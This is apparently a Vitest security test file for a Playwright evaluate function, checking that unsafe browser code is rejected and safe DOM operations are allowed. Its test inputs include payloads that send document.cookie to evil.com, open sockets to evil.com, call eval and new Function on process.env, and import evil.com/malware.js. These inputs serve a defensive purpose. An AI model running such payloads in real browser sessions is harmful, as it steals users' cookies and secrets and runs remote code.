import { beforeEach, describe, expect, it, vi } from "vitest";
import { UnsafeEvaluateCodeError } from "./pw-evaluate-validation.js";

let currentPage: Record<string, unknown> | null = null;
let pageState: {
  console: unknown[];
  armIdUpload: number;
  armIdDialog: number;
  armIdDownload: number;
};

const sessionMocks = vi.hoisted(() => ({
  getPageForTargetId: vi.fn(async () => {
    if (!currentPage) {
      throw new Error("missing page");
    }
    return currentPage;
  }),
  ensurePageState: vi.fn(() => pageState),
  restoreRoleRefsForTarget: vi.fn(() => {}),
  refLocator: vi.fn(() => ({
    evaluate: vi.fn(async () => "locator-result"),
  })),
  rememberRoleRefsForTarget: vi.fn(() => {}),
}));

vi.mock("./pw-session.js", () => sessionMocks);

async function importModule() {
  return await import("./pw-tools-core.js");
}

describe("VULN-037: evaluateViaPlaywright blocks unsafe code", () => {
  beforeEach(() => {
    currentPage = { evaluate: vi.fn(async () => "page-result") };
    pageState = {
      console: [],
      armIdUpload: 0,
      armIdDialog: 0,
      armIdDownload: 0,
    };
    for (const fn of Object.values(sessionMocks)) {
      fn.mockClear();
    }
  });

  describe("blocks data exfiltration attempts", () => {
    it("blocks fetch() in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `fetch('https://evil.com', { body: document.cookie })`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });

    it("blocks WebSocket in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `new WebSocket('wss://evil.com')`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });

    it("blocks XMLHttpRequest in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://evil.com')`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });

    it("blocks navigator.sendBeacon in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `navigator.sendBeacon('https://evil.com', document.cookie)`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });
  });

  describe("blocks code execution attempts", () => {
    it("blocks eval() in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `eval('malicious code')`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });

    it("blocks new Function() in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `new Function('return process.env')()`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });

    it("blocks dynamic import in browser evaluate", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `import('https://evil.com/malware.js')`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
    });
  });

  describe("allows safe DOM operations", () => {
    it("allows safe page evaluate", async () => {
      const mod = await importModule();
      const result = await mod.evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:18792",
        fn: `(el) => el.textContent`,
      });
      expect(result).toBe("page-result");
    });

    it("allows safe element evaluate with ref", async () => {
      const mod = await importModule();
      const result = await mod.evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:18792",
        fn: `(el) => el.innerText`,
        ref: "button-1",
      });
      expect(result).toBe("locator-result");
    });

    it("allows document.querySelector operations", async () => {
      const mod = await importModule();
      const result = await mod.evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:18792",
        fn: `document.querySelector('.my-class').textContent`,
      });
      expect(result).toBe("page-result");
    });

    it("allows JSON operations", async () => {
      const mod = await importModule();
      const result = await mod.evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:18792",
        fn: `JSON.stringify({ a: 1, b: 2 })`,
      });
      expect(result).toBe("page-result");
    });

    it("allows Array.from with DOM elements", async () => {
      const mod = await importModule();
      const result = await mod.evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:18792",
        fn: `Array.from(document.querySelectorAll('a')).map(a => a.href)`,
      });
      expect(result).toBe("page-result");
    });
  });

  describe("validates before page access", () => {
    it("rejects unsafe code before attempting to get page", async () => {
      const mod = await importModule();
      await expect(
        mod.evaluateViaPlaywright({
          cdpUrl: "http://127.0.0.1:18792",
          fn: `fetch('https://evil.com')`,
        }),
      ).rejects.toThrow(UnsafeEvaluateCodeError);
      // getPageForTargetId should not have been called
      expect(sessionMocks.getPageForTargetId).not.toHaveBeenCalled();
    });
  });
});
